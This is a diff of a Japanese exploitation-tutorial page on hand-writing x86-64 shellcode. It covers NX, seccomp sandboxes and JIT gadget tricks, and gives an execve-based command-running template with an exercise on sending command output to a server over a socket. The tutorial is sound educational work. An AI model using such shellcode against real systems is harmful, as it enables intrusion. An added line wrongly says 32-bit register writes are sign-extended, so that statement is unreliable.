@@ -18,7 +18,13 @@
     <meta name="author" content="ptr-yudai">
 
 
+    <meta name="subtitle" content="pawnyable">
 
+
+    <meta name="description" content="Let's learn pwnable with cute animals.">
+
+
+    <meta name="keywords" content="linux,windows,kernel,browser,vm,exploit,exploitation,binary exploit,pwn,pwnable">
 
 
 
@@ -133,13 +139,17 @@ p.spoiler {
     <div class="post-info">
         <div class="post-title">
             
-            
                 シェルコードの書き方
-            
-            
+                        
         </div>
     </div>
     <div class="h-line-primary"></div>
+    
+    
+        <div class="column" title="目次">
+            
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%82%B7%E3%82%A7%E3%83%AB%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AFNX%E3%81%A7%E6%B6%88%E6%BB%85%E3%81%97%E3%81%9F%EF%BC%9F"><span class="toc-text">シェルコードはNXで消滅した？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%82%B5%E3%83%B3%E3%83%89%E3%83%9C%E3%83%83%E3%82%AF%E3%82%B9%E4%B8%8B%E3%81%A7%E3%81%AE%E3%82%B7%E3%82%A7%E3%83%AB%E3%82%B3%E3%83%BC%E3%83%89"><span class="toc-text">サンドボックス下でのシェルコード</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JIT%E3%81%A8%E3%82%B7%E3%82%A7%E3%83%AB%E3%82%B3%E3%83%BC%E3%83%89"><span class="toc-text">JITとシェルコード</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%82%B7%E3%82%A7%E3%83%AB%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E6%9B%B8%E3%81%84%E3%81%A6%E3%81%BF%E3%82%88%E3%81%86"><span class="toc-text">シェルコードを書いてみよう</span></a></li></ol>
+        </div>
     
 </div>
 
@@ -150,7 +160,7 @@ p.spoiler {
 <ul>
 <li><a href="#-------nx------">シェルコードはNXで消滅した？</a>
 <ul>
-<li><a href="#----------------">複雑な処理はシェルコードで書こう</a></li>
+<li><a href="#----------------">サンドボックス下でのシェルコード</a></li>
 <li><a href="#jit-------">JITとシェルコード</a></li>
 </ul>
 </li>
@@ -160,86 +170,94 @@ p.spoiler {
 <br>
 </div>
 <h2 id="シェルコードはNXで消滅した？">シェルコードはNXで消滅した？</h2>
-<p>シェルコードはもともと名前の通り、「シェルを起動する機械語」にちなんで登場した言葉ですが、実際には「攻撃に利用する機械語」程度の意味合いで使われています。言葉の定義はどうでもいいので、その内容を確認していきましょう。</p>
-<p>シェルコードが他の手法よりも大きく優れているのは安定性です。関数ポインタを書き換えてsystem関数を呼び出したり、ROPによるコード実行は通常バイナリ依存となります。実世界の攻撃では、攻撃対象が使っているバイナリとまったく同じものを入手するのは難しいため、ROPを使う場合はバージョンごとにROP chainを分けてexploit中に記載します。しかし、シェルコードの場合はアドレスさえリークできていれば、そこへジャンプするだけで確実にコードが実行できます。</p>
-<p>しかし、ご存知の通り、NXという考え方が登場してからはメモリ上のほとんどの領域がW^X<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>になり、シェルコードが使えなくなりました。そのためCTFの問題では特に、関数ポインタの書き換えやROPが主流になり、シェルコードに関する問題は入門者向け、あるいは意味不明な制約を付けて難易度を担保したような状況でしか見ないかと思います。ところが実際にはシェルコードは非常に強力で、多くの状況で必要になってきます。</p>
-<h3 id="複雑な処理はシェルコードで書こう">複雑な処理はシェルコードで書こう</h3>
-<p>任意コマンド実行するだけのような簡単なコードであればROPで事足りますが、場合によってはそうはいきません。近年多くのアプリがサンドボックス機構を取り入れるようになっています。Linuxの場合seccompが代表的な例でしょう。seccompはシステムコール番号などから使えるシステムコールを手軽に制限できる機能です。当然開発者は任意コマンド実行されたくないので、execveなどのシステムコールを禁止します。<br>
-このような場合、サンドボックスを回避したり、あるいはサンドボックス下で最大限悪用可能なコードを走らせるためにはシェルコードが必要になります。もちろんROPでも実現可能ですが、サンドボックスを回避するような複雑な処理であればシェルコードの方が楽でしょう。</p>
-<p>また、攻撃対象のマシンでエクスプロイトを実行する場合、シェルを起動するだけでは意味がないことが多いです。攻撃者は、侵入後にマルウェアを展開するなど、より複雑な操作を実行します。このような処理は、当然ROPで書くよりもシェルコードを使った方が簡単な場合が多いです。</p>
-<p>つまり、複雑な処理が要求される場合はROPを諦めて、シェルコードで書いた方が圧倒的にエクスプロイトが簡潔になります。</p>
+<p>シェルコードはもともと名前の通り、「シェルを起動する機械語」にちなんで登場した言葉ですが、実際には「攻撃に利用する機械語」程度の意味合いで使われています。言葉の定義はどうでも良いので、その内容を確認していきましょう。</p>
+<p>シェルコードが他の手法よりも大きく優れているのは安定性です。関数ポインタを書き換えてsystem関数を呼び出したり、ROPによるコード実行は通常バイナリ依存となります。実世界の攻撃で、攻撃対象として動いているバイナリとまったく同じものを入手するのは困難なことが多いです。そのため、ROPを使う場合はバージョンごとにROP chainを分けてexploit中に記載します。しかし、シェルコードの場合はアドレスさえリークできていれば、そこへジャンプするだけで確実にコードが実行できます。</p>
+<p>しかし、ご存知の通り、NXという考え方が登場してからはメモリ上のほとんどの領域がW^X<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>になり、シェルコードが使えなくなりました。そのためCTFの問題では特に、関数ポインタの書き換えやROPが主流になり、シェルコードに関する問題は相当入門者向けのような状況でしか見なくなりました。ところが、実際にはシェルコードは非常に強力で、多くの状況で必要になってきます。</p>
+<h3 id="サンドボックス下でのシェルコード">サンドボックス下でのシェルコード</h3>
+<p>任意コマンドを実行するだけのような簡単なコードであればROPで事足りますが、場合によってはそうはいきません。近年多くのアプリがサンドボックス機構を取り入れるようになっています。Linuxの場合seccompが代表的な例でしょう。seccompはシステムコール番号などから使えるシステムコールを手軽に制限できる機能です。当然開発者は任意コマンド実行されたくないので、execveなどのシステムコールを禁止します。<br>
+このような場合、サンドボックスを回避したり、あるいはサンドボックス下で最大限悪用可能なコードを走らせるためにはシェルコードが必要になります。もちろんROPでも実現可能ですが、サンドボックスを回避するような複雑な処理であればシェルコードの方が楽でしょう。<br>
+つまり、複雑な処理が要求される状況においては、ROPを諦めてシェルコードで書いた方が圧倒的にexploitが簡潔になります。</p>
 <h3 id="JITとシェルコード">JITとシェルコード</h3>
 <p>ブラウザ（JavaScriptエンジン）のような大規模なアプリケーションになってくると実行時コンパイラ(JIT)が組み込まれています。JITは動的に機械語を生成する必要があるため、必然的に実行可能領域を割り当てます。</p>
-<p>JITの中にはW^Xの考え方を実現していないものもあり、例えば2021年までのChromeのJavaScriptエンジンであるV8は、WebAssemblyのコンパイル時に生成する機械語領域をRWXのまま使っていました。このようにJITが作るRWXページは当然ながら攻撃の対象となります。</p>
-<p>さらに、JITが作るページが書き込み不可だったとしても、ほとんどの場合でシェルコードが実現できます。例えば次のように、32-bitの算術演算だけが許される電卓のような言語のJITが搭載されていたとしましょう。</p>
+<p>JITの中にはW^Xの考え方を実現していないものもあり、例えば2021年現在のChromeのJavaScriptエンジンであるV8は、WebAssemblyのコンパイル時に生成する機械語領域をRWXのまま使っています。このようにJITが作るRWXページは当然ながら攻撃の対象となっています。また、仮にW^Xだとしても、JITではほとんどの場合シェルコードが実現できます。<br>
+例えば次のように、32-bitの算術演算だけが許される電卓のような言語のJITが搭載されていたとしましょう。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x  = 32227377</span><br><span class="line">x += 32193712</span><br><span class="line">x -= 12780815</span><br></pre></td></tr></table></figure>
-<p>これをコンパイルすると、生成される機械語は次のようになるでしょう。</p>
+<p>これをコンパイルすると次のようになるでしょう。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00h: B8 31 C0 EB 01    mov eax, 32227377</span><br><span class="line">05h: 05 B0 3C EB 01    add eax, 32193712</span><br><span class="line">0Ah: 2D 0F 05 C3 00    sub eax, 12780815</span><br></pre></td></tr></table></figure>
 <p>この領域は実行可能になりますが、電卓なので当然システムコール呼び出しのような機械語は生成されません。ところが、この何の問題もない機械語を2バイト目から解釈すると次のようになります。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">01h: 31 C0    xor eax, eax</span><br><span class="line">03h: EB 01    jmp 6h</span><br><span class="line">05h: 05       db 05h</span><br><span class="line">06h: B0 3C    mov al, 60</span><br><span class="line">08h: EB 01    jmp Bh</span><br><span class="line">0Ah: 2D       db 2Dh</span><br><span class="line">0Bh: 0F 05    syscall</span><br><span class="line">0Dh: C3       ret</span><br></pre></td></tr></table></figure>
-<p>eaxを60にしてシステムコールを呼び出す機械語になってしまいました。このようにして、中のコードで使われる定数をある程度制御できる場合、シェルコードやROP gadgetを攻撃者が用意できます。</p>
+<p>eaxを60にしてシステムコールを呼び出す機械語になってしまいました。このように、JITが存在する場合は例えその領域が書き込み不能でも、中のコードで使われる定数をある程度制御できる場合、シェルコードやROP gadgetを攻撃者が用意できます。</p>
 <div class="balloon_l">
   <div class="faceicon"><img src="../img/piyo.jpg" alt="ひよこ先生" ></div>
   <p class="says">
     このような手法を<strong>Bring Your Own Gadget</strong>などと呼ぶよ。
+    対策として、定数を参照やエンコードした状態に置き換えて機械語中に登場させないConstant Blindingという手法があるよ。
   </p>
 </div>
 <h2 id="シェルコードを書いてみよう">シェルコードを書いてみよう</h2>
-<p>シェルコードが必要となったときに入門者がやりがちなのが、shell-stormなどインターネットに転がっているシェルコードを使うことです。このようなシェルコードというのは以下の3つの特徴があります。</p>
+<p>シェルコードが必要となったときに入門者が陥りやすいのが、shell-stormなどインターネットに転がっているシェルコードを使うことです。検索で上位に出てくるシェルコードの多くには以下の3つの特徴があります。</p>
 <ol>
 <li>NULLバイトを使っていない</li>
 <li><code>/bin/sh</code>という文字列を使わない</li>
 <li>なるべく短く書かれている</li>
 </ol>
-<p>1は<code>strcpy</code>でもシェルコードがコピーされるようにという意図でしょうが、そのようなシェルコードが要求されることは滅多にありません。NULLバイトを使わないという制約は多くの場合無駄です。<br>
-次に、<code>/bin/sh</code>という文字列を使わずxorやnotで組み立てるシェルコードが出回っています。これはエンコーダと呼ばれ、アンチウイルス等の検知を逃れる目的です。今回はそのようなPost-Exploitationの世界は対象としないので、このような制約も無駄です。<br>
-3つ目に、インターネット上のシェルコードの中には不思議なほど短さを意識しているものがあります。短い方が良いと思っているのか分かりませんが、数バイト単位の字数制限が要求される状況も滅多にありません。極端に短いシェルコードはむしろ欠点があります。こういったインターネット上のシェルコードはレジスタやスタックの初期状態を仮定している場合が多く、そのまま使おうとすると動かないケースがあります。短いけど動かないシェルコードを書くくらいなら、長くても読みやすいシェルコードを心がけましょう。</p>
-<p>また、インターネットにあるシェルコードは「<code>/bin/sh</code>を起動する」であったり「リバースシェルを取る」であったり、とにかく典型的な処理だけです。実際に要求されるのは状況に応じた複雑な処理ですし、そもそも典型的な処理をすぐにアセンブリで書けないようでは生きていけません。（複雑なシェルコードは後の章で実践します。）</p>
+<p>1は<code>strcpy</code>でもシェルコードがコピーされるようにという意図でしょうが、そのようなシェルコードが要求されることは滅多にありません。NULLバイトを使わないという制約は無駄です。<br>
+次に、<code>/bin/sh</code>という文字列を使わずxorやnotで組み立てるシェルコードが出回っています。これはエンコーダと呼ばれ、アンチウイルス等の検知を逃れる目的です。今回はそのようなPost-Exploitationの世界は対象としないので、このような制約は無駄です。<br>
+3つ目に、インターネット上のシェルコードの中には不思議なほど短さを意識しているものがあります。数バイト単位の字数制限が要求される状況は滅多にないどころか、極端に短いシェルコードはむしろ欠点があります。短いシェルコードはレジスタやスタックの初期状態を仮定している場合が多く、そのまま使おうとすると動かないケースがあります。短いけど動かないシェルコードを書くくらいなら、長くても読みやすいシェルコードを心がけましょう。</p>
+<p>また、検索で出てくるシェルコードは「<code>/bin/sh</code>を起動する」であったり「リバースシェルを取る」であったり、一般的な状況で使えるように設計された典型的な処理が多いです。しかし、実際に要求されるのは状況に応じた複雑な処理ですし、そもそも典型的な処理すらすぐにアセンブリで書けないようではpawnyableの世界で生きていけません。（複雑なシェルコードは後の章で実践します。）</p>
 <div class="balloon_l">
   <div class="faceicon"><img src="../img/piyo.jpg" alt="ひよこ先生" ></div>
   <p class="says">
-    自然界は厳しい。コマンドを呼び出すシェルコードも手書きできないようでは生きていけない。
+    自然界は厳しいのでコマンドを呼び出すシェルコードも手書きできないようでは生きていけない。
   </p>
 </div>
-<p>ひよこ先生もそう言っているので、まずは例として<code>/bin/ls -lha</code>を呼び出すシェルコードを書いてみましょう。このシェルコードを書く際に必要となる技術は以下の3つだけです。</p>
+<p>ひよこ先生もそう言っているので、まずは例として<code>/bin/ls -lha</code>を呼び出すシェルコードを書いてみましょう。<br>
+ただし、実行するコマンドは簡単に置き換えられるようにしたいです。すなわち、</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/bin/ls -lha&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+<p>を実行させます。このシェルコードを書く際に必要となる技術は以下の3つだけです。</p>
 <ol>
 <li>文字列ポインタの取得</li>
 <li>引数リストの用意</li>
 <li>システムコールの呼び出し</li>
 </ol>
+<p>シェルコードをテストするためにはnasmとldを使いましょう。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nasm ls.S -o ls.o -fELF64</span><br><span class="line">$ ld ls.o -o ls.elf</span><br></pre></td></tr></table></figure>
 <p>まず1つ目の文字列ポインタですが、よく見られるのがpush命令を使ってスタックに文字列を用意する例です。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rax, &#x27;/bin/sh\0&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br></pre></td></tr></table></figure>
-<p>これでも構いませんが、コマンドが長くなると分割する必要があるので面倒です。</p>
-<p>x86-64にはlea命令があります。こちらの方がわかりやすい上、短くて済むので使ってあげましょう。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  lea rdi, [rel s_arg0]</span><br><span class="line">  ...</span><br><span class="line">s_arg0: db &quot;/bin/sh&quot;, 0</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x0068732f6e69622f</span><br><span class="line">push rax</span><br></pre></td></tr></table></figure>
+<p>64-bitにはlea命令があります。こちらの方が短くて済む上、文字列を8バイトごとに区切る手間が省けるので積極的に使いましょう。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; nasm test.S -fELF64</span><br><span class="line">; ld test.o</span><br><span class="line">_start:</span><br><span class="line">  lea rdi, [rel s_arg0]</span><br><span class="line">  ...</span><br><span class="line">s_arg0: db &quot;/bin/sh&quot;, 0</span><br></pre></td></tr></table></figure>
+<p>GCCでアセンブルする場合は、次のように書きます。（これより後はすべてNASM記法を採用します。）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// gcc test.S -masm=intel</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">.global main</span><br><span class="line">main:</span><br><span class="line">  lea rdi, [rip+s_arg0] // or s_arg0[rip]</span><br><span class="line">  ...</span><br><span class="line">s_arg0: .string &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>
 <p>さらに短くしたいならcall命令を使っても良いです。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  call s_arg0</span><br><span class="line">  db &quot;/bin/sh&quot;, 0</span><br><span class="line">s_arg0:</span><br><span class="line">  pop rdi</span><br></pre></td></tr></table></figure>
-<p>次に引数リストの用意です。これは機械語領域が書き込み可能ならmov命令でも良いですし、そうでないならスタックでも良いです。配列の終端にはNULLを入れ忘れないようにしましょう。</p>
+<p>次に引数リストの用意です。これは機械語領域が書き込み可能ならmov命令でも良いですし、そうでないならスタックでも良いです。配列の終端はNULLを入れるのを忘れないようにしましょう。<br>
+書き込み領域がない場合は先にmmapを呼んでデータ領域を確保しても構いません。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  xor edx, edx</span><br><span class="line">  push rdx</span><br><span class="line">  lea rdi, [rel s_arg2]</span><br><span class="line">  push rdi</span><br><span class="line">  lea rdi, [rel s_arg1]</span><br><span class="line">  push rdi</span><br><span class="line">  lea rdi, [rel s_arg0]</span><br><span class="line">  push rdi</span><br><span class="line">  mov rsi, rsp</span><br><span class="line">  ...</span><br><span class="line">s_arg2: db &quot;/bin/ls -lha&quot;, 0</span><br><span class="line">s_arg1: db &quot;-c&quot;, 0</span><br><span class="line">s_arg0: db &quot;/bin/sh&quot;, 0</span><br></pre></td></tr></table></figure>
 <div class="balloon_l">
   <div class="faceicon"><img src="../img/piyo.jpg" alt="ひよこ先生" ></div>
   <p class="says">
-    x86-64では32-bitのレジスタに結果を代入すると上位32-bitは0になるよ。
+    x86-64では32-bitのレジスタに結果を代入すると自動的に64-bitに符号拡張されるよ。
     だから「xor eax,eax」で確実にraxを0にできるんだね。
   </p>
 </div>
-<p>こちらもcall命令を利用することで短くできますが、読みやすさは若干失われます。</p>
+<p>こちらもcall命令を利用することで短くできますが、可読性は若干失われます。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  xor edx, edx</span><br><span class="line">  push rdx</span><br><span class="line">  call s_arg2</span><br><span class="line">  db &quot;/bin/ls -lha&quot;, 0</span><br><span class="line">s_arg2:</span><br><span class="line">  call s_arg1</span><br><span class="line">  db &quot;-c&quot;, 0</span><br><span class="line">s_arg1:</span><br><span class="line">  call s_arg0</span><br><span class="line">  db &quot;/bin/sh&quot;, 0</span><br><span class="line">s_arg0:</span><br><span class="line">  mov rsi, rsp</span><br></pre></td></tr></table></figure>
-<p>最後にシステムコールです。raxがシステムコール番号、rdi, rsi, rdxの順に第一、第二、第三引数であることくらいは覚えておきましょう。x86-64で<code>execve</code>が59番、<code>exit</code>が60番、<code>read</code>, <code>write</code>, <code>open</code>がそれぞれ0, 1, 2番など、よく使うシステムコール番号も覚えておければシェルコードを書くときに手が止まることはないです。</p>
+<p>最後にシステムコールです。raxがシステムコール番号、rdi, rsi, rdxの順に第一、第二、第三引数であることくらいは覚えておきましょう。<code>execve</code>が59番、<code>exit</code>が60番、<code>read</code>, <code>write</code>, <code>open</code>がそれぞれ0, 1, 2番など、よく使うシステムコール番号も覚えておければシェルコードを書くときに手が止まることはないです。</p>
 <p>これだけで、文字列を変えればどんなコマンドでも実行できる便利なシェルコードができました。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">  xor edx, edx</span><br><span class="line">  push rdx</span><br><span class="line">  lea rdi, [rel s_arg2]</span><br><span class="line">  push rdi</span><br><span class="line">  lea rdi, [rel s_arg1]</span><br><span class="line">  push rdi</span><br><span class="line">  lea rdi, [rel s_arg0]</span><br><span class="line">  push rdi</span><br><span class="line">  mov rsi, rsp</span><br><span class="line">  mov eax, 59</span><br><span class="line">  syscall</span><br><span class="line">  int3</span><br><span class="line"></span><br><span class="line">s_arg0: db &quot;/bin/sh&quot;, 0</span><br><span class="line">s_arg1: db &quot;-c&quot;, 0</span><br><span class="line">s_arg2: db &quot;/bin/ls -lha&quot;, 0</span><br></pre></td></tr></table></figure>
-<p>このサイトではシェルコードをテストするためにはnasmとldを使います。そのため、アセンブリはIntel記法で書きます。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nasm ls.S -o ls.o -fELF64</span><br><span class="line">$ ld ls.o -o ls.elf</span><br></pre></td></tr></table></figure>
 <p>Exploitから直接使えるようにしておくと便利です。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ptrlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">assembly = <span class="built_in">open</span>(<span class="string">&quot;ls.S&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">shellcode = nasm(assembly, bits=<span class="number">64</span>)</span><br></pre></td></tr></table></figure>
 <p>今回作ったシェルコードは<a href="src/ls.S">ここ</a>からダウンロードできます。</p>
 <hr>
 <div class="column" title="例題１">
-  <code>rep movsb</code>命令を使ってmemcpy相当のプログラムを書いてください。
+  <code>rep movsb</code>命令を使ってmemcpy相当のシェルコードを書いてください。
 </div>
 <div class="column" title="例題２">
-  「シェルコード領域は書き込み可能であるがRSPの初期値が0から始まる」という状況で、次のようなシェルコードを書いたところ、Segmentation Faultを起こしてしまいました。
+  シェルコード領域は書き込み可能だがRSPの初期値が0から始まる状況で、次のようなシェルコードを書いたところ、Segmentation Faultを起こしてしまいました。
   <pre>
+; $ nasm test.S -fELF64
+; $ ld test.o --omagic
+; $ ./a.out
 global _start
 section .text
 _start:
@@ -262,10 +280,12 @@ s_arg0: db "/bin/sh", 0
 s_arg1: db "-c", 0
 s_arg2: db "/bin/ls -lha", 0
   </pre>
-  原因を特定して直してください。（ヒント：textセクションを書き込み可能にするにはldに<code>--omagic</code>オプションを渡す。）
+  原因を特定して直してください。
 </div>
 <div class="column" title="例題３">
-  「ls -lha」した結果を自分のサーバー（例：127.0.0.1:8080）に送信するシェルコードを書いてください。（ヒント：標準入出力をsocketのfdにdupするとpipeを作らなくてもexecveするだけで結果が転送される。）
+  「ls -lha」した結果を自分のサーバー（例：127.0.0.1:8080）に送信するシェルコードを書いてください。
+  ただし、"/dev/tcp"などのスペシャルデバイスファイルは使わないこと。
+  （ヒント：標準入出力をsocketのfdにdupするとpipeを作らなくてもexecveするだけで結果が転送される。）
 </div>
 <p><a href="how2write-answer.html">☞ 例題の解答</a></p>
 <hr class="footnotes-sep">
@@ -296,7 +316,7 @@ s_arg2: db "/bin/ls -lha", 0
     <div class="flex-container">
         <div class="footer-text">
             
-                © 2022 ptr-yudai 🐈
+                © 2023 ptr-yudai 🐈
                 <br>
             
             
